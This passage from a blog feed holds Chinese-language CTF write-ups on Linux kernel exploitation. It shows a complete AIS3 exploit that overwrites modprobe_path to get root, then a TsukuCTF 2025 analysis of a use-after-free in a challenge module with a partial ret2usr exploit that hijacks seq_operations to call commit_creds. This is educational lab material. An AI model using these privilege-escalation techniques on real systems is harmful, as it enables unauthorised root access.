class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> <span class="hljs-title function_">get_physical</span><span class="hljs-params">(<span class="hljs-type">void</span> *ptr)</span><br><br>&#123;<br>  <span class="hljs-type">long</span> lVar1;<br>  ulonglong addr;<br>  <br>  lVar1 = _copy_from_user(&amp;addr,ptr,<span class="hljs-number">8</span>);<br>  <span class="hljs-keyword">if</span> (lVar1 == <span class="hljs-number">0</span>) &#123;<br>    lVar1 = _phys_base;<br>    <span class="hljs-keyword">if</span> (addr &lt; <span class="hljs-number">0xffffffff80000000</span>) &#123;<br>      lVar1 = <span class="hljs-number">-0x80000000</span> - _page_offset_base;<br>    &#125;<br>    addr = addr + <span class="hljs-number">0x80000000</span> + lVar1;<br>    lVar1 = _copy_to_user(ptr,&amp;addr,<span class="hljs-number">8</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123;<br>    lVar1 = <span class="hljs-number">-0xe</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> lVar1;<br>&#125;<br></code></pre></td></tr></table></figure><p>總結起來就是:</p><ol><li>用<code>get_physical()</code>獲取<code>modprobe_path</code>的物理記憶體位址</li><li>用<code>peek_physical()</code>讓<code>modprobe_path</code>的物理記憶體映射到另一個虛擬記憶體位址上(位址固定<code>0xffffc90000045620</code>)</li><li>用<code>write_to_address()</code>修改虛擬記憶體位址<code>0xffffc90000045620</code>的資料，由於這個位址也是映射到<code>modprobe_path</code>，就可以達成目的</li></ol><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">GetPhysicalData</span> &#123;</span><br>        <span class="hljs-type">size_t</span> addr;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PeekPhysicalData</span> &#123;</span><br>        <span class="hljs-type">size_t</span> phyaddr;<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> peeksize;<br>        <span class="hljs-type">char</span> * peekdata;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">WriteToAddrData</span> &#123;</span><br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> target;<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> src;<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> size;<br>&#125;;<br><br><span class="hljs-type">size_t</span> modprobe_path = <span class="hljs-number">0xffffffff82444620</span>;<br><span class="hljs-type">char</span> GETSHELL[] = <span class="hljs-string">&quot;/home/user/binary&quot;</span>;<br><br><span class="hljs-type">int</span> fd;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">prepare</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// dummy</span><br>        fd = syscall(SYS_memfd_create, <span class="hljs-string">&quot;badbin&quot;</span>, <span class="hljs-number">0</span>);<br>        write(fd, <span class="hljs-string">&quot;\xff\xff\xff\xff&quot;</span>, <span class="hljs-number">4</span>); <span class="hljs-comment">// Invalid binary</span><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">exploit</span><span class="hljs-params">()</span> &#123;<br>        system(<span class="hljs-string">&quot;chmod 777 /flag&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">if</span> (getuid() == <span class="hljs-number">0</span>) &#123;<br>                exploit();<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br><br>        prepare();<br>        <span class="hljs-type">int</span> fd1 = open(<span class="hljs-string">&quot;/proc/EBH&quot;</span>, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-comment">// get physical address</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">GetPhysicalData</span> <span class="hljs-title">phy</span>;</span><br>        phy.addr = modprobe_path;<br>        ioctl(fd1, <span class="hljs-number">0x4700</span>, &amp;phy);<br><br>        <span class="hljs-comment">// create mapping</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PeekPhysicalData</span> <span class="hljs-title">cmap</span>;</span><br>        cmap.phyaddr = phy.addr;<br>        cmap.peeksize = <span class="hljs-number">0x20</span>;<br>        <span class="hljs-type">char</span> * peekdata;<br>        peekdata = <span class="hljs-built_in">malloc</span>(cmap.peeksize);<br>        cmap.peekdata = peekdata;<br>        ioctl(fd1, <span class="hljs-number">0x5000</span>, &amp;cmap);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] modprobe_path = \&quot;%s\&quot;\n&quot;</span>, peekdata);<br><br>        <span class="hljs-comment">// overwrite modprobe_path</span><br>        <span class="hljs-type">size_t</span> mapped_modprobe_path = <span class="hljs-number">0xffffc90000045620</span>;<br>        <span class="hljs-type">char</span> * data;<br>        data = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">32</span>);<br>        <span class="hljs-built_in">memset</span>(data, <span class="hljs-number">0</span>, <span class="hljs-number">32</span>);<br>        <span class="hljs-built_in">strncpy</span>(data, GETSHELL, <span class="hljs-built_in">strlen</span>(GETSHELL)+<span class="hljs-number">1</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;data = \&quot;%s\&quot;\n&quot;</span>, data);<br><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">WriteToAddrData</span> <span class="hljs-title">writedt</span>;</span><br>        writedt.target = mapped_modprobe_path;<br>        writedt.src = data;<br>        writedt.size = <span class="hljs-built_in">strlen</span>(GETSHELL)+<span class="hljs-number">1</span>;<br>        ioctl(fd1, <span class="hljs-number">0x5700</span>, &amp;writedt);<br><br>        <span class="hljs-comment">// exploit</span><br>        <span class="hljs-type">char</span> path[<span class="hljs-number">64</span>];<br>        <span class="hljs-built_in">snprintf</span>(path, <span class="hljs-keyword">sizeof</span>(path), <span class="hljs-string">&quot;/proc/self/fd/%d&quot;</span>, fd);<br>        execl(path, <span class="hljs-string">&quot;badbin&quot;</span>, <span class="hljs-literal">NULL</span>);<br><br>        <span class="hljs-comment">// read flag</span><br>        sleep(<span class="hljs-number">2</span>);<br>        <span class="hljs-type">char</span> flag_buf[<span class="hljs-number">128</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>        <span class="hljs-type">int</span> flagfd = open(<span class="hljs-string">&quot;/flag&quot;</span>, O_RDWR | O_CREAT);<br>        read(flagfd, flag_buf, <span class="hljs-number">128</span>);<br>        close(flagfd);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;flag -&gt; %s\n&quot;</span>, flag_buf);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>Flag: <code>AIS3&#123;Oh_n0_1_fOrg37_%O_`iounmap`,_T_Wi|l_r3m*MbEr_i7_Ne/t_t1m#_QAQ&#125;</code></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Linux Kernel Pwn</category>
      
      <category>writeups</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TsukuCTF 2025 writeups: easy_kernel</title>
    <link href="/2025/05/05/TsukuCTF-2025-writeups-easy-kernel/"/>
    <url>/2025/05/05/TsukuCTF-2025-writeups-easy-kernel/</url>
    
    <content type="html"><![CDATA[<h1 id="Challenge"><a href="#Challenge" class="headerlink" title="Challenge"></a>Challenge</h1><p><img src="/2025/05/05/TsukuCTF-2025-writeups-easy-kernel/1.png" alt="image"></p><p>flag在<code>/dev/sdb</code>，只有root可以讀取到</p><p>本題附檔有給源代碼</p><p>本題沒有開啟kpti，沒有開啟kaslr(內核的東西位址都固定)</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">~ # cat /proc/cmdline<br><span class="hljs-attribute">root</span>=/dev/sda rw <span class="hljs-attribute">init</span>=/init <span class="hljs-attribute">console</span>=ttyS0 nokaslr nopti <span class="hljs-attribute">loglevel</span>=0 <span class="hljs-attribute">oops</span>=panic <span class="hljs-attribute">panic</span>=-1<br></code></pre></td></tr></table></figure><p>本題的CPU也沒有支援SMEP跟SMAP，所以內核態可以訪問&#x2F;執行用戶空間的數據</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">~ <span class="hljs-meta"># grep -E <span class="hljs-string">&#x27;smep|smap&#x27;</span> /proc/cpuinfo</span><br>~ <span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p>本題Linux 6.14.2，<code>prepare_kernel_cred(NULL)</code>已經無法直接或取<code>init_cred</code>，但沒開kaslr，所以可以直接找到<code>init_cred</code>的位址然後<code>commit_creds(&amp;init_cred)</code></p><h2 id="掛載題目磁碟映像"><a href="#掛載題目磁碟映像" class="headerlink" title="掛載題目磁碟映像"></a>掛載題目磁碟映像</h2><p>本題的磁碟映像在<code>rootfs.ext3</code>，用以下指令就可以掛載到系統上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">mkdir</span> /mnt/ext3<br><span class="hljs-built_in">sudo</span> mount ./rootfs.ext3 /mnt/ext3<br></code></pre></td></tr></table></figure><p>直接<code>cd /mnt/ext3</code>在裡面編寫及編譯exploit就可以了</p><h1 id="Analyze"><a href="#Analyze" class="headerlink" title="Analyze"></a>Analyze</h1><h2 id="init"><a href="#init" class="headerlink" title="init"></a>init</h2><p>題目會載入自製的kernel module<code>vuln.ko</code>，後面會針對它做分析<br><img src="/2025/05/05/TsukuCTF-2025-writeups-easy-kernel/2.png" alt="image"></p><h2 id="vuln-ko-init-module"><a href="#vuln-ko-init-module" class="headerlink" title="vuln.ko &#x2F; init_module"></a>vuln.ko &#x2F; init_module</h2><p>會註冊一個設備<code>/dev/vuln</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">module_initialize</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>    <span class="hljs-keyword">if</span> (misc_register(&amp;vuln_dev) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="vuln-ko-cleanup-module"><a href="#vuln-ko-cleanup-module" class="headerlink" title="vuln.ko &#x2F; cleanup_module"></a>vuln.ko &#x2F; cleanup_module</h2><p>拿掉設備<code>/dev/vuln</code>，並摧毀互斥鎖<code>module_lock</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> __exit <span class="hljs-title function_">module_cleanup</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>    misc_deregister(&amp;vuln_dev);<br>    mutex_destroy(&amp;module_lock);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="vuln-ko-module-ioctl"><a href="#vuln-ko-module-ioctl" class="headerlink" title="vuln.ko &#x2F; module_ioctl"></a>vuln.ko &#x2F; module_ioctl</h2><p>在開始操作之前，會先把互斥鎖<code>module_lock</code>上鎖，操作結束之後才會把<code>module_lock</code>解鎖，所以race condition是沒有了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">module_ioctl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg)</span> &#123;<br>    <span class="hljs-type">request_t</span> req;<br>    <span class="hljs-type">long</span> ret;<br>    <span class="hljs-keyword">if</span> (copy_from_user(&amp;req, (<span class="hljs-type">void</span> *)arg, <span class="hljs-keyword">sizeof</span>(req)) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    mutex_lock(&amp;module_lock);<br>    <span class="hljs-keyword">switch</span>(cmd) &#123;<br>        <span class="hljs-keyword">case</span> CMD_ALLOC:<br>            ret = obj_alloc();<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> CMD_WRITE:<br>            ret = obj_write(req.data, req.size);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> CMD_FREE:<br>            ret = obj_free();<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            ret = <span class="hljs-number">-1</span>;<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>    mutex_unlock(&amp;module_lock);<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>這裡有三種操作可以做</p><ul><li>CMD_ALLOC(0xf000) - 如果指針<code>obj</code>是空指針，就會kzalloc一塊<code>struct obj</code>大小(0x20)的記憶體，把位址存到全域變數指針<code>obj</code></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">obj_alloc</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>    <span class="hljs-keyword">if</span> (obj != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    obj = kzalloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> obj), GFP_KERNEL);<br>    <span class="hljs-keyword">if</span> (obj == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>CMD_WRITE(0xf001) - 如果指針<code>obj</code>不為空指針，而且<code>size</code>(寫入資料大小)不超過<code>struct obj</code>的大小(0x20)，就可以把資料<code>data</code>寫入<code>obj</code>指向的記憶體</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">obj_write</span><span class="hljs-params">(<span class="hljs-type">char</span> *data, <span class="hljs-type">size_t</span> size)</span> &#123;<br>    <span class="hljs-keyword">if</span> (obj == <span class="hljs-literal">NULL</span> || size &gt; OBJ_SIZE) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (copy_from_user(obj-&gt;buf, data, size) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>CMD_FREE(0xf002) - 把<code>obj</code>指向的記憶體free掉，但沒有清空指針，造成UAF，可以搭配CMD_WRITE攻擊。但因為CMD_ALLOC會檢查<code>obj</code>是不是空指針，所以一旦CMD_FREE之後就不能再進行CMD_ALLOC(操作會失敗)，在這個<code>vuln.ko</code>中只能<code>kzalloc</code>一次</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">obj_free</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>    kfree(obj);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>因為只能<code>kzalloc</code>一次，所以劫持freelist的就別想了。</p><p>在Linux中，open一個<code>/proc/self/stat</code>時，內核會從heap分配一個0x20大小的記憶體，當成<code>struct seq_operations</code>用<br><a href="https://elixir.bootlin.com/linux/v6.14.5/source/include/linux/seq_file.h#L31">https://elixir.bootlin.com/linux/v6.14.5/source/include/linux/seq_file.h#L31</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> &#123;</span><br><span class="hljs-type">void</span> * (*start) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">loff_t</span> *pos);<br><span class="hljs-type">void</span> (*stop) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v);<br><span class="hljs-type">void</span> * (*next) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v, <span class="hljs-type">loff_t</span> *pos);<br><span class="hljs-type">int</span> (*show) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v);<br>&#125;;<br></code></pre></td></tr></table></figure><p>而read<code>proc/self/stat</code>時，內核會調用到<code>seq_read_iter()</code><br><a href="https://elixir.bootlin.com/linux/v6.14.5/source/fs/seq_file.c#L171">https://elixir.bootlin.com/linux/v6.14.5/source/fs/seq_file.c#L171</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Ready-made -&gt;f_op-&gt;read_iter()</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">seq_read_iter</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kiocb *iocb, <span class="hljs-keyword">struct</span> iov_iter *iter)</span><br></code></pre></td></tr></table></figure><p>先看到這邊，<code>struct seq_file</code>的member<code>op</code>就是一個指向<code>struct seq_operations</code>的指針<br><a href="https://elixir.bootlin.com/linux/v6.14.5/source/include/linux/seq_file.h#L16">https://elixir.bootlin.com/linux/v6.14.5/source/include/linux/seq_file.h#L16</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_file</span> &#123;</span><br><span class="hljs-type">char</span> *buf;<br><span class="hljs-type">size_t</span> size;<br><span class="hljs-type">size_t</span> from;<br><span class="hljs-type">size_t</span> count;<br><span class="hljs-type">size_t</span> pad_until;<br><span class="hljs-type">loff_t</span> index;<br><span class="hljs-type">loff_t</span> read_pos;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">lock</span>;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> *<span class="hljs-title">op</span>;</span><br><span class="hljs-type">int</span> poll_event;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">file</span>;</span><br><span class="hljs-type">void</span> *private;<br>&#125;;<br></code></pre></td></tr></table></figure><p>回到<code>seq_read_iter()</code>，<code>m</code>就是一個指向<code>struct seq_file</code>的指針。<br>在Ln225中，會呼叫<code>m-&gt;op-&gt;start</code>的function<br><a href="https://elixir.bootlin.com/linux/v6.14.5/source/fs/seq_file.c#L225">https://elixir.bootlin.com/linux/v6.14.5/source/fs/seq_file.c#L225</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_file</span> *<span class="hljs-title">m</span> =</span> iocb-&gt;ki_filp-&gt;private_data;<br>...<br><span class="hljs-comment">// get a non-empty record in the buffer</span><br>p = m-&gt;op-&gt;start(m, &amp;m-&gt;index);<br>...<br></code></pre></td></tr></table></figure><p>因為這題沒開KPTI、SMAP、SMEP，可以訪問&#x2F;執行用戶態數據，所以可以寫userspace shellcode打ret2usr(難怪會叫easy_kernel，這年頭沒人保護全關了)</p><p>總結以上，若我們</p><ol><li>CMD_ALLOC一個0x20大小的記憶體之後，CMD_FREE掉它</li><li><code>open(&quot;/proc/self/stat&quot;, O_RDONLY)</code>，內核alloc一塊0x20的記憶體當成<code>struct seq_operations</code>時剛好申請到上一步時候free掉的記憶體，就會有一個<code>struct seq_operations</code>落入我們的控制</li><li>透過UAF，CMD_WRITE對這個已經被當成<code>struct seq_operations</code>的記憶體做寫入，把<code>start</code>改成userspace上的shellcode的位址</li><li>read<code>/proc/self/stat</code>時，呼叫<code>m-&gt;op-&gt;start</code>，成功跳到shellcode上，就可以做提權</li></ol><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// musl-gcc -static -Os -s exp.c -o exp2</span><br><span class="hljs-comment">// python3 upload.py /mnt/ext3/exp2 challs.tsukuctf.org 19000</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">size_t</span> size;<br>    <span class="hljs-type">char</span> *data;<br>&#125; <span class="hljs-type">request_t</span>;<br><br><span class="hljs-type">size_t</span> commit_creds = <span class="hljs-number">0xffffffff812a1050</span>;<br><span class="hljs-type">size_t</span> init_cred = <span class="hljs-number">0xffffffff81e3bfa0</span>;<br><br><span class="hljs-type">int</span> (*commit_creds_kfunc)(<span class="hljs-type">void</span> *cred);<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">ret2usr_attack</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    commit_creds_kfunc = (<span class="hljs-type">int</span> (*)(<span class="hljs-type">void</span>*)) commit_creds;<br><br>    (*commit_creds_kfunc)(init_cred);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// main</span><br>        <span class="hljs-type">int</span> fd1 = open(<span class="hljs-string">&quot;/dev/vuln&quot;</span>, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-type">request_t</span> req;<br>        <span class="hljs-comment">// alloc chunk#1 and free it</span><br>        ioctl(fd1, <span class="hljs-number">0xf000</span>, &amp;req);<br>        ioctl(fd1, <span class="hljs-number">0xf002</span>, &amp;req);<br><br>        <span class="hljs-comment">// chunk#1 now is a 